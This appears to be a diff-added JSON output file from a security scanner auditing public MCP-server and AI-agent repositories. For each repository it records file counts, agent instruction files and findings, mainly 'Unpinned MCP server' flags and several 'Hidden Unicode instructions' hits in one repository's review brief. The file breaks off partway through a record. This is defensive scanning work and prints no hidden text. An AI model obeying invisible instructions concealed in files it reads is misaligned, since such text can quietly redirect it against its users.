+        ".opencode/skills/echocache-deps/SKILL.md",
+        ".opencode/skills/echocache-gain/SKILL.md",
+        ".claude/agents/codebase-orienter.md",
+        ".claude/skills/echocache-cache/SKILL.md",
+        ".claude/skills/context7-mcp/SKILL.md",
+        ".claude/skills/echocache-deps/SKILL.md",
+        ".claude/skills/echocache-gain/SKILL.md",
+        "AGENTS.md",
+        "CLAUDE.md"
+      ],
+      "scanMs": 99,
+      "ms": 471,
+      "findings": []
+    },
+    "error-path/opendrs": {
+      "repo": "error-path/opendrs",
+      "sha": "00143efb60d7033f17fc6f67f1620fc22e013391",
+      "status": "ok",
+      "filesDownloaded": 800,
+      "filesScanned": 800,
+      "filesSkipped": 0,
+      "roles": {
+        "docs": 128,
+        "config": 354,
+        "instruction": 9,
+        "code": 274,
+        "unknown": 34,
+        "manifest": 1
+      },
+      "agentFiles": 3,
+      "agentFileSample": [
+        "plugin/skills/opendrs/SKILL.md",
+        "AGENTS.md",
+        "CLAUDE.md"
+      ],
+      "scanMs": 1550,
+      "ms": 3006,
+      "findings": [
+        {
+          "ruleId": "EX-001",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Hidden Unicode instructions",
+          "file": "docs/superpowers/plans/2026-10-18-review-brief.md",
+          "line": 345,
+          "span": "\\u200B"
+        },
+        {
+          "ruleId": "EX-001",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Hidden Unicode instructions",
+          "file": "docs/superpowers/plans/2026-10-18-review-brief.md",
+          "line": 371,
+          "span": "\\u200B"
+        },
+        {
+          "ruleId": "EX-001",
+          "severity": "critical",
+          "source": "signature",
+          "title": "Hidden Unicode instructions",
+          "file": "docs/superpowers/plans/2026-10-18-review-brief.md",
+          "line": 434,
+          "span": "\\u202E"
+        },
+        {
+          "ruleId": "EX-001",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Hidden Unicode instructions",
+          "file": "docs/superpowers/plans/2026-10-18-review-brief.md",
+          "line": 449,
+          "span": "\\u200B"
+        },
+        {
+          "ruleId": "EX-001",
+          "severity": "critical",
+          "source": "signature",
+          "title": "Hidden Unicode instructions",
+          "file": "docs/superpowers/plans/2026-10-18-review-brief.md",
+          "line": 471,
+          "span": "\\u202A"
+        },
+        {
+          "ruleId": "EX-001",
+          "severity": "critical",
+          "source": "signature",
+          "title": "Hidden Unicode instructions",
+          "file": "docs/superpowers/plans/2026-10-18-review-brief.md",
+          "line": 471,
+          "span": "\\u202E\\u2066"
+        },
+        {
+          "ruleId": "EX-001",
+          "severity": "critical",
+          "source": "signature",
+          "title": "Hidden Unicode instructions",
+          "file": "docs/superpowers/plans/2026-10-18-review-brief.md",
+          "line": 471,
+          "span": "\\u2069"
+        },
+        {
+          "ruleId": "EX-001",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Hidden Unicode instructions",
+          "file": "docs/superpowers/plans/2026-10-18-review-brief.md",
+          "line": 485,
+          "span": "\\u200C"
+        },
+        {
+          "ruleId": "EX-001",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Hidden Unicode instructions",
+          "file": "docs/superpowers/plans/2026-10-18-review-brief.md",
+          "line": 486,
+          "span": "\\u200C"
+        },
+        {
+          "ruleId": "EX-001",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Hidden Unicode instructions",
+          "file": "docs/superpowers/plans/2026-10-18-review-brief.md",
+          "line": 489,
+          "span": "\\u200B"
+        }
+      ]
+    },
+    "lacs-project/sysknife": {
+      "repo": "lacs-project/sysknife",
+      "sha": "949e16ffab7d6a0888986cd3090fd14cdc862abe",
+      "status": "ok",
+      "filesDownloaded": 1442,
+      "filesScanned": 1337,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 901,
+        "instruction": 10,
+        "config": 58,
+        "docs": 54,
+        "manifest": 3,
+        "code": 311
+      },
+      "agentFiles": 1,
+      "agentFileSample": [
+        "CLAUDE.md"
+      ],
+      "scanMs": 1533,
+      "ms": 3970,
+      "findings": []
+    },
+    "muammar-yacoob/GMail-Manager-MCP": {
+      "repo": "muammar-yacoob/GMail-Manager-MCP",
+      "sha": "fb1e435a2783c29cdc1af07929892e12a18d1f3b",
+      "status": "ok",
+      "filesDownloaded": 56,
+      "filesScanned": 56,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 12,
+        "config": 6,
+        "code": 33,
+        "docs": 3,
+        "instruction": 1,
+        "manifest": 1
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 125,
+      "ms": 556,
+      "findings": []
+    },
+    "velvetway/minreestr-mcp": {
+      "repo": "velvetway/minreestr-mcp",
+      "sha": "87ba7724b29a0803ca7df839c738e77f1101bf16",
+      "status": "ok",
+      "filesDownloaded": 13,
+      "filesScanned": 13,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 4,
+        "config": 3,
+        "code": 5,
+        "instruction": 1
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 35,
+      "ms": 455,
+      "findings": []
+    },
+    "scrape-badger/scrapebadger-mcp": {
+      "repo": "scrape-badger/scrapebadger-mcp",
+      "sha": "1a68ad9717f81238a4181457ccc804133917da48",
+      "status": "ok",
+      "filesDownloaded": 21,
+      "filesScanned": 21,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 4,
+        "config": 5,
+        "docs": 2,
+        "code": 9,
+        "instruction": 1
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 90,
+      "ms": 415,
+      "findings": []
+    },
+    "drhalto/agentmako": {
+      "repo": "drhalto/agentmako",
+      "sha": "e0aaf381f7fbf0a8ea328d8256eafa58364d803d",
+      "status": "ok",
+      "filesDownloaded": 848,
+      "filesScanned": 848,
+      "filesSkipped": 0,
+      "roles": {
+        "docs": 12,
+        "config": 52,
+        "instruction": 69,
+        "unknown": 72,
+        "code": 614,
+        "manifest": 29
+      },
+      "agentFiles": 49,
+      "agentFileSample": [
+        "mako-ai-claude-plugin/skills/mako-database/SKILL.md",
+        "mako-ai-claude-plugin/skills/mako-code-intel/SKILL.md",
+        "mako-ai-claude-plugin/skills/mako-discovery/SKILL.md",
+        "mako-ai-claude-plugin/skills/mako-neighborhoods/SKILL.md",
+        "mako-ai-claude-plugin/skills/mako-workflow/SKILL.md",
+        "mako-ai-claude-plugin/skills/mako-graph/SKILL.md",
+        "mako-ai-claude-plugin/skills/mako-trace/SKILL.md",
+        "mako-ai-claude-plugin/skills/mako-guide/SKILL.md",
+        "plugins/claude-code/skills/mako-database/SKILL.md",
+        "plugins/claude-code/skills/mako-code-intel/SKILL.md",
+        "plugins/claude-code/skills/mako-discovery/SKILL.md",
+        "plugins/claude-code/skills/mako-neighborhoods/SKILL.md",
+        "plugins/claude-code/skills/mako-workflow/SKILL.md",
+        "plugins/claude-code/skills/mako-graph/SKILL.md",
+        "plugins/claude-code/skills/mako-trace/SKILL.md",
+        "plugins/claude-code/skills/mako-guide/SKILL.md",
+        "plugins/gemini/skills/mako-database/SKILL.md",
+        "plugins/gemini/skills/mako-code-intel/SKILL.md",
+        "plugins/gemini/skills/mako-discovery/SKILL.md",
+        "plugins/gemini/skills/mako-neighborhoods/SKILL.md",
+        "plugins/gemini/skills/mako-workflow/SKILL.md",
+        "plugins/gemini/skills/mako-graph/SKILL.md",
+        "plugins/gemini/skills/mako-trace/SKILL.md",
+        "plugins/gemini/skills/mako-guide/SKILL.md",
+        "plugins/cursor/skills/mako-database/SKILL.md"
+      ],
+      "scanMs": 1141,
+      "ms": 2469,
+      "findings": [
+        {
+          "ruleId": "EX-010",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Unpinned MCP server",
+          "file": "mako-ai-claude-plugin/.mcp.json",
+          "line": 5,
+          "span": "agentmako"
+        },
+        {
+          "ruleId": "EX-010",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Unpinned MCP server",
+          "file": "plugins/claude-code/.mcp.json",
+          "line": 5,
+          "span": "agentmako"
+        },
+        {
+          "ruleId": "EX-010",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Unpinned MCP server",
+          "file": "plugins/gemini/.mcp.json",
+          "line": 5,
+          "span": "agentmako"
+        },
+        {
+          "ruleId": "EX-010",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Unpinned MCP server",
+          "file": "plugins/gemini/extension.json",
+          "line": 8,
+          "span": "agentmako"
+        },
+        {
+          "ruleId": "EX-010",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Unpinned MCP server",
+          "file": "plugins/cursor/mcp.json",
+          "line": 5,
+          "span": "agentmako"
+        },
+        {
+          "ruleId": "EX-010",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Unpinned MCP server",
+          "file": "plugins/codex/.mcp.json",
+          "line": 5,
+          "span": "agentmako"
+        }
+      ]
+    },
+    "mandarelabs/mandare": {
+      "repo": "mandarelabs/mandare",
+      "sha": "327442e714d35632c2cfc911f7839b69cbb0e4c7",
+      "status": "ok",
+      "filesDownloaded": 428,
+      "filesScanned": 428,
+      "filesSkipped": 0,
+      "roles": {
+        "config": 59,
+        "docs": 18,
+        "code": 258,
+        "unknown": 52,
+        "mcp-config": 1,
+        "instruction": 24,
+        "manifest": 16
+      },
+      "agentFiles": 16,
+      "agentFileSample": [
+        ".claude/settings.json",
+        "integrations/openclaw/mandare/SKILL.md",
+        "packages/ledger/CLAUDE.md",
+        "packages/witness/CLAUDE.md",
+        "packages/policy-engine/CLAUDE.md",
+        "packages/mcp-server/CLAUDE.md",
+        "packages/spec/CLAUDE.md",
+        "packages/passport/CLAUDE.md",
+        "packages/witness-protocol/CLAUDE.md",
+        "packages/sdk/CLAUDE.md",
+        "packages/card-rail/CLAUDE.md",
+        "packages/verifier/CLAUDE.md",
+        "packages/gateway/CLAUDE.md",
+        "packages/vault/CLAUDE.md",
+        "apps/cli/CLAUDE.md",
+        "CLAUDE.md"
+      ],
+      "scanMs": 596,
+      "ms": 1390,
+      "findings": []
+    },
+    "phuocdu/agentpay-vn": {
+      "repo": "phuocdu/agentpay-vn",
+      "sha": "11c57451bd0e6cbe2a9d57d802f842d42bfe7f9a",
+      "status": "ok",
+      "filesDownloaded": 20,
+      "filesScanned": 20,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 4,
+        "config": 6,
+        "instruction": 2,
+        "code": 5,
+        "mcp-config": 1,
+        "docs": 2
+      },
+      "agentFiles": 2,
+      "agentFileSample": [
+        "examples/claude_desktop_config.json",
+        "skills/agentpay-vn/SKILL.md"
+      ],
+      "scanMs": 51,
+      "ms": 294,
+      "findings": [
+        {
+          "ruleId": "EX-010",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Unpinned MCP server",
+          "file": ".claude-plugin/plugin.json",
+          "line": 2,
+          "span": "agentpay-vn"
+        }
+      ]
+    },
+    "atomno-mcp/mcp-fns-calc": {
+      "repo": "atomno-mcp/mcp-fns-calc",
+      "sha": "7a3912f2567a72b65d08b665ea1c0459139a9f2f",
+      "status": "ok",
+      "filesDownloaded": 26,
+      "filesScanned": 26,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 6,
+        "config": 5,
+        "docs": 1,
+        "code": 13,
+        "instruction": 1
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 42,
+      "ms": 321,
+      "findings": []
+    },
+    "Tomatio13/mcp-server-tavily": {
+      "repo": "Tomatio13/mcp-server-tavily",
+      "sha": "261215247293d6299b108f9f887eeddb5006ac97",
+      "status": "ok",
+      "filesDownloaded": 14,
+      "filesScanned": 14,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 5,
+        "config": 3,
+        "instruction": 2,
+        "code": 4
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 35,
+      "ms": 298,
+      "findings": []
+    },
+    "a-25/ios-mcp-code-quality-server": {
+      "repo": "a-25/ios-mcp-code-quality-server",
+      "sha": "8c9e0f95826a403b1e2c4f4f8dbe406586aee2b0",
+      "status": "ok",
+      "filesDownloaded": 53,
+      "filesScanned": 53,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 3,
+        "code": 38,
+        "instruction": 2,
+        "config": 8,
+        "manifest": 1,
+        "docs": 1
+      },
+      "agentFiles": 1,
+      "agentFileSample": [
+        ".github/copilot-instructions.md"
+      ],
+      "scanMs": 93,
+      "ms": 402,
+      "findings": []
+    },
+    "rm-rf-prod/GroundTruth-MCP": {
+      "repo": "rm-rf-prod/GroundTruth-MCP",
+      "sha": "0f0e194ed75f431952cc6ae30919bc8130a949fc",
+      "status": "ok",
+      "filesDownloaded": 506,
+      "filesScanned": 506,
+      "filesSkipped": 0,
+      "roles": {
+        "docs": 5,
+        "config": 16,
+        "unknown": 17,
+        "instruction": 1,
+        "manifest": 1,
+        "code": 466
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 514,
+      "ms": 1210,
+      "findings": []
+    },
+    "ictinnovations/ictbroadcast-mcp": {
+      "repo": "ictinnovations/ictbroadcast-mcp",
+      "sha": "da56a626993cb6b6ccfb31e5f7779bbe86b61a20",
+      "status": "ok",
+      "filesDownloaded": 18,
+      "filesScanned": 18,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 3,
+        "code": 6,
+        "config": 6,
+        "instruction": 1,
+        "manifest": 1,
+        "mcp-config": 1
+      },
+      "agentFiles": 1,
+      "agentFileSample": [
+        "examples/claude_desktop_config.json"
+      ],
+      "scanMs": 33,
+      "ms": 297,
+      "findings": [
+        {
+          "ruleId": "EX-010",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Unpinned MCP server",
+          "file": "examples/claude_desktop_config.json",
+          "line": 5,
+          "span": "ictbroadcast-mcp"
+        }
+      ]
+    },
+    "attalla1/photopea-mcp-server": {
+      "repo": "attalla1/photopea-mcp-server",
+      "sha": "7dd18067e7fbfc15c81904e035787902c2dd7793",
+      "status": "ok",
+      "filesDownloaded": 27,
+      "filesScanned": 27,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 5,
+        "code": 16,
+        "instruction": 1,
+        "config": 3,
+        "manifest": 1,
+        "docs": 1
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 46,
+      "ms": 584,
+      "findings": []
+    },
+    "lucygoodchild/mcp-national-rail": {
+      "repo": "lucygoodchild/mcp-national-rail",
+      "sha": "68e2d57b50d1eeb513c75eb6d1303d9c43e5b43b",
+      "status": "ok",
+      "filesDownloaded": 12,
+      "filesScanned": 12,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 3,
+        "instruction": 1,
+        "config": 3,
+        "manifest": 1,
+        "code": 4
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 24,
+      "ms": 249,
+      "findings": []
+    },
+    "bguillow-rgb/pour-picks-mcp": {
+      "repo": "bguillow-rgb/pour-picks-mcp",
+      "sha": "9c9d264630c45fcd8a19373686d9fb6421d726a9",
+      "status": "ok",
+      "filesDownloaded": 16,
+      "filesScanned": 16,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 3,
+        "config": 6,
+        "instruction": 2,
+        "manifest": 1,
+        "code": 4
+      },
+      "agentFiles": 1,
+      "agentFileSample": [
+        "GEMINI.md"
+      ],
+      "scanMs": 33,
+      "ms": 444,
+      "findings": []
+    },
+    "strato-space/media-gen-mcp": {
+      "repo": "strato-space/media-gen-mcp",
+      "sha": "893feb7b043984924c9d23c5f3face21966c55f7",
+      "status": "ok",
+      "filesDownloaded": 36,
+      "filesScanned": 36,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 5,
+        "code": 20,
+        "docs": 6,
+        "instruction": 2,
+        "config": 2,
+        "manifest": 1
+      },
+      "agentFiles": 1,
+      "agentFileSample": [
+        "AGENTS.md"
+      ],
+      "scanMs": 92,
+      "ms": 1321,
+      "findings": []
+    },
+    "MakeaMouse/fish-bridge-mcp": {
+      "repo": "MakeaMouse/fish-bridge-mcp",
+      "sha": "e995e569fbb9bb396fa26f82c5c0d4445cea204e",
+      "status": "ok",
+      "filesDownloaded": 92,
+      "filesScanned": 92,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 7,
+        "config": 11,
+        "docs": 14,
+        "code": 55,
+        "instruction": 5
+      },
+      "agentFiles": 4,
+      "agentFileSample": [
+        ".github/copilot-instructions.md",
+        "GEMINI.md",
+        "AGENTS.md",
+        "CLAUDE.md"
+      ],
+      "scanMs": 270,
+      "ms": 641,
+      "findings": [
+        {
+          "ruleId": "EX-010",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Unpinned MCP server",
+          "file": "examples/copilot-mcp-config.json",
+          "line": 5,
+          "span": "fish-bridge-mcp"
+        },
+        {
+          "ruleId": "EX-010",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Unpinned MCP server",
+          "file": "examples/claude-mcp-config.json",
+          "line": 5,
+          "span": "fish-bridge-mcp"
+        },
+        {
+          "ruleId": "EX-010",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Unpinned MCP server",
+          "file": "examples/cursor-mcp-config.json",
+          "line": 5,
+          "span": "fish-bridge-mcp"
+        }
+      ]
+    },
+    "tribal-memory/tribal": {
+      "repo": "tribal-memory/tribal",
+      "sha": "1ab5854bf74da46b26550d79a157e77de878a5d2",
+      "status": "ok",
+      "filesDownloaded": 53,
+      "filesScanned": 53,
+      "filesSkipped": 0,
+      "roles": {
+        "config": 12,
+        "unknown": 34,
+        "mcp-config": 1,
+        "instruction": 3,
+        "docs": 3
+      },
+      "agentFiles": 3,
+      "agentFileSample": [
+        ".claude/settings.json",
+        ".claude/commands/review-ticket.md",
+        ".claude/commands/draft-ticket.md"
+      ],
+      "scanMs": 50,
+      "ms": 398,
+      "findings": []
+    },
+    "qr-maker-io/mcp-server": {
+      "repo": "qr-maker-io/mcp-server",
+      "sha": "261589156869a79db6a4526008c8508a5f2c6d2e",
+      "status": "ok",
+      "filesDownloaded": 33,
+      "filesScanned": 33,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 3,
+        "config": 3,
+        "instruction": 1,
+        "manifest": 1,
+        "code": 25
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 48,
+      "ms": 304,
+      "findings": []
+    },
+    "Explorer-64/imagcon-mcp": {
+      "repo": "Explorer-64/imagcon-mcp",
+      "sha": "5e6e92d19b203c6beef266cbd36c8ad43637edde",
+      "status": "ok",
+      "filesDownloaded": 20,
+      "filesScanned": 20,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 3,
+        "config": 5,
+        "code": 11,
+        "instruction": 1
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 54,
+      "ms": 404,
+      "findings": []
+    },
+    "Bartolome69/garmin-mcp": {
+      "repo": "Bartolome69/garmin-mcp",
+      "sha": "d4db6613f0043f75687852ff0e170d1954573eed",
+      "status": "ok",
+      "filesDownloaded": 157,
+      "filesScanned": 157,
+      "filesSkipped": 0,
+      "roles": {
+        "docs": 14,
+        "config": 14,
+        "unknown": 28,
+        "code": 97,
+        "instruction": 4
+      },
+      "agentFiles": 2,
+      "agentFileSample": [
+        ".claude/skills/deploy-check/SKILL.md",
+        "skills/half-marathon-pfitzinger/SKILL.md"
+      ],
+      "scanMs": 491,
+      "ms": 1049,
+      "findings": []
+    },
+    "adityatiwari101104/contribos": {
+      "repo": "adityatiwari101104/contribos",
+      "sha": "343fd435033f89f3984e2076f135436f9dc5fa35",
+      "status": "ok",
+      "filesDownloaded": 39,
+      "filesScanned": 39,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 4,
+        "config": 4,
+        "code": 27,
+        "instruction": 1,
+        "docs": 3
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 81,
+      "ms": 439,
+      "findings": []
+    },
+    "ypratap11/dokimo-mcp": {
+      "repo": "ypratap11/dokimo-mcp",
+      "sha": "25683a11f1faea708b9bde15cae18ddc6e36f42b",
+      "status": "ok",
+      "filesDownloaded": 15,
+      "filesScanned": 15,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 3,
+        "config": 5,
+        "code": 5,
+        "instruction": 2
+      },
+      "agentFiles": 1,
+      "agentFileSample": [
+        "skills/dokimo-verify/SKILL.md"
+      ],
+      "scanMs": 35,
+      "ms": 288,
+      "findings": []
+    },
+    "mahdibrr/dev-error-explainers": {
+      "repo": "mahdibrr/dev-error-explainers",
+      "sha": "0fc912a1af4c3d208b61255dbe26df2921428f3b",
+      "status": "ok",
+      "filesDownloaded": 1296,
+      "filesScanned": 1290,
+      "filesSkipped": 0,
+      "roles": {
+        "code": 121,
+        "config": 379,
+        "unknown": 366,
+        "docs": 420,
+        "mcp-config": 1,
+        "instruction": 2,
+        "manifest": 1
+      },
+      "agentFiles": 2,
+      "agentFileSample": [
+        ".mcp.json",
+        "skills/explain-dev-error/SKILL.md"
+      ],
+      "scanMs": 1889,
+      "ms": 3376,
+      "findings": []
+    },
+    "f4ww4z/mcp-mysql-server": {
+      "repo": "f4ww4z/mcp-mysql-server",
+      "sha": "9e0a7df0cb5d1edaa0017ae555ae10aa4e69ce0c",
+      "status": "ok",
+      "filesDownloaded": 10,
+      "filesScanned": 10,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 3,
+        "instruction": 1,
+        "config": 3,
+        "manifest": 1,
+        "code": 2
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 38,
+      "ms": 360,
+      "findings": []
+    },
+    "wisflux/docmost-local-mcp": {
+      "repo": "wisflux/docmost-local-mcp",
+      "sha": "0bb296068227c9d2eb4e83731806867c2b0b98f6",
+      "status": "ok",
+      "filesDownloaded": 53,
+      "filesScanned": 53,
+      "filesSkipped": 0,
+      "roles": {
+        "config": 4,
+        "unknown": 42,
+        "docs": 2,
+        "instruction": 2,
+        "code": 2,
+        "manifest": 1
+      },
+      "agentFiles": 1,
+      "agentFileSample": [
+        "CLAUDE.md"
+      ],
+      "scanMs": 64,
+      "ms": 439,
+      "findings": []
+    },
+    "irskep/persistproc": {
+      "repo": "irskep/persistproc",
+      "sha": "7889c26f0f4ea6c52dadd8ec68595bc5f5ab99f6",
+      "status": "ok",
+      "filesDownloaded": 61,
+      "filesScanned": 61,
+      "filesSkipped": 0,
+      "roles": {
+        "config": 11,
+        "instruction": 6,
+        "unknown": 7,
+        "docs": 8,
+        "code": 29
+      },
+      "agentFiles": 5,
+      "agentFileSample": [
+        ".cursor/rules/100_run_in_venv.mdc",
+        ".cursor/rules/200_logging_strategy.mdc",
+        ".cursor/rules/300_no_function_imports.mdc",
+        ".claude/commands/release.md",
+        "CLAUDE.md"
+      ],
+      "scanMs": 166,
+      "ms": 633,
+      "findings": []
+    },
+    "infino-ai/infino-mcp": {
+      "repo": "infino-ai/infino-mcp",
+      "sha": "6c8da4647c2ce291342c0b3c9aa9435a12f143cf",
+      "status": "ok",
+      "filesDownloaded": 38,
+      "filesScanned": 38,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 3,
+        "code": 15,
+        "config": 15,
+        "docs": 2,
+        "instruction": 2,
+        "manifest": 1
+      },
+      "agentFiles": 1,
+      "agentFileSample": [
+        "plugin/skills/using-infino/SKILL.md"
+      ],
+      "scanMs": 154,
+      "ms": 640,
+      "findings": [
+        {
+          "ruleId": "EX-010",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Unpinned MCP server",
+          "file": "plugin/.mcp.json",
+          "line": 5,
+          "span": "@infino-ai/mcp-server"
+        }
+      ]
+    },
+    "douglasgan/asktian-mcp": {
+      "repo": "douglasgan/asktian-mcp",
+      "sha": "0c6b219a16a1fe5fa6f55faf18b3798eeaddd223",
+      "status": "ok",
+      "filesDownloaded": 29,
+      "filesScanned": 29,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 5,
+        "config": 6,
+        "docs": 4,
+        "instruction": 1,
+        "manifest": 1,
+        "code": 12
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 72,
+      "ms": 399,
+      "findings": []
+    },
+    "weibaohui/kom": {
+      "repo": "weibaohui/kom",
+      "sha": "225fe434e11d721c74738a8b5ed3c5a18f04f5f7",
+      "status": "ok",
+      "filesDownloaded": 251,
+      "filesScanned": 251,
+      "filesSkipped": 0,
+      "roles": {
+        "instruction": 15,
+        "unknown": 221,
+        "code": 1,
+        "docs": 6,
+        "config": 8
+      },
+      "agentFiles": 10,
+      "agentFileSample": [
+        ".trae/skills/openspec-apply-change/SKILL.md",
+        ".trae/skills/openspec-explore/SKILL.md",
+        ".trae/skills/openspec-verify-change/SKILL.md",
+        ".trae/skills/openspec-new-change/SKILL.md",
+        ".trae/skills/openspec-archive-change/SKILL.md",
+        ".trae/skills/openspec-onboard/SKILL.md",
+        ".trae/skills/openspec-bulk-archive-change/SKILL.md",
+        ".trae/skills/openspec-continue-change/SKILL.md",
+        ".trae/skills/openspec-sync-specs/SKILL.md",
+        ".trae/skills/openspec-ff-change/SKILL.md"
+      ],
+      "scanMs": 304,
+      "ms": 698,
+      "findings": []
+    },
+    "Rarefied-Earth/groundwork": {
+      "repo": "Rarefied-Earth/groundwork",
+      "sha": "148a338f49dcd8455d66805b094f2dc5039b957b",
+      "status": "ok",
+      "filesDownloaded": 25,
+      "filesScanned": 25,
+      "filesSkipped": 0,
+      "roles": {
+        "code": 5,
+        "config": 6,
+        "instruction": 3,
+        "unknown": 4,
+        "docs": 6,
+        "manifest": 1
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 57,
+      "ms": 356,
+      "findings": []
+    },
+    "hao-ji-xing/awesome-cursor": {
+      "repo": "hao-ji-xing/awesome-cursor",
+      "sha": "bf80f871f31ff6325a3c1be86a1f1efe04a6aa66",
+      "status": "ok",
+      "filesDownloaded": 3,
+      "filesScanned": 3,
+      "filesSkipped": 0,
+      "roles": {
+        "config": 1,
+        "unknown": 1,
+        "instruction": 1
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 21,
+      "ms": 298,
+      "findings": []
+    },
+    "toolstem/toolstem-sec-mcp-server": {
+      "repo": "toolstem/toolstem-sec-mcp-server",
+      "sha": "7dd22e19fa6b56be2ea5ef3e6a4d19ba48fcc2b1",
+      "status": "ok",
+      "filesDownloaded": 32,
+      "filesScanned": 32,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 6,
+        "config": 11,
+        "code": 12,
+        "docs": 1,
+        "instruction": 1,
+        "manifest": 1
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 74,
+      "ms": 400,
+      "findings": []
+    },
+    "Work90210/APIFold": {
+      "repo": "Work90210/APIFold",
+      "sha": "ffae6f30e4bae3f0e79369a0452ba81144c0468a",
+      "status": "ok",
+      "filesDownloaded": 790,
+      "filesScanned": 790,
+      "filesSkipped": 0,
+      "roles": {
+        "docs": 15,
+        "config": 117,
+        "unknown": 240,
+        "instruction": 2,
+        "manifest": 12,
+        "code": 404
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 946,
+      "ms": 1787,
+      "findings": []
+    },
+    "blefnk/awesome-cursor-rules": {
+      "repo": "blefnk/awesome-cursor-rules",
+      "sha": "eb2fdbc5ad0ae9aedeae09965e54ea6ad88dc715",
+      "status": "ok",
+      "filesDownloaded": 24,
+      "filesScanned": 24,
+      "filesSkipped": 0,
+      "roles": {
+        "docs": 20,
+        "unknown": 2,
+        "instruction": 1,
+        "config": 1
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 52,
+      "ms": 312,
+      "findings": []
+    },
+    "pilot-repl/getcursor": {
+      "repo": "pilot-repl/getcursor",
+      "sha": "e2d8891290b3cb96441de8458bfed9219bc763cc",
+      "status": "ok",
+      "filesDownloaded": 4,
+      "filesScanned": 4,
+      "filesSkipped": 0,
+      "roles": {
+        "code": 2,
+        "unknown": 1,
+        "instruction": 1
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 16,
+      "ms": 270,
+      "findings": []
+    },
+    "ivangrynenko/cursorrules": {
+      "repo": "ivangrynenko/cursorrules",
+      "sha": "8f652d24057ca37feae1c4a7185662f5589b0f5c",
+      "status": "ok",
+      "filesDownloaded": 127,
+      "filesScanned": 127,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 7,
+        "docs": 27,
+        "instruction": 72,
+        "code": 19,
+        "config": 2
+      },
+      "agentFiles": 70,
+      "agentFileSample": [
+        ".cursor/rules/javascript-software-data-integrity-failures.mdc",
+        ".cursor/rules/python-insecure-design.mdc",
+        ".cursor/rules/drupal-authentication-failures.mdc",
+        ".cursor/rules/cursor-rules.mdc",
+        ".cursor/rules/build-optimization.mdc",
+        ".cursor/rules/accessibility-standards.mdc",
+        ".cursor/rules/project-definition-template.mdc",
+        ".cursor/rules/vortex-scaffold-standards.mdc",
+        ".cursor/rules/behat-steps.mdc",
+        ".cursor/rules/python-authentication-failures.mdc",
+        ".cursor/rules/drupal-security-misconfiguration.mdc",
+        ".cursor/rules/drupal-vulnerable-components.mdc",
+        ".cursor/rules/lagoon-docker-compose-standards.mdc",
+        ".cursor/rules/python-injection.mdc",
+        ".cursor/rules/javascript-security-logging-monitoring-failures.mdc",
+        ".cursor/rules/python-integrity-failures.mdc",
+        ".cursor/rules/javascript-broken-access-control.mdc",
+        ".cursor/rules/security-practices.mdc",
+        ".cursor/rules/debugging-standards.mdc",
+        ".cursor/rules/code-generation-standards.mdc",
+        ".cursor/rules/python-ssrf.mdc",
+        ".cursor/rules/javascript-performance.mdc",
+        ".cursor/rules/behat-ai-guide.mdc",
+        ".cursor/rules/javascript-vulnerable-outdated-components.mdc",
+        ".cursor/rules/javascript-insecure-design.mdc"
+      ],
+      "scanMs": 234,
